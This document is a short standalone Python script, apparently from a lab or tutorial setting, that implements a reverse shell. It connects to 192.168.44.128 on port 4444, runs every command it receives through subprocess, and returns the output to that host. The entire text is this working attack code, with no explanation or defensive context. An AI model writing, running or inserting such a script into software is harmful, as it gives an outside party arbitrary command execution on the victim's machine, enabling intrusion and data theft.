import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.44.128", 4444))

while True:
    command = s.recv(1024).decode()
    output = subprocess.getoutput(command)
    s.send(output.encode())
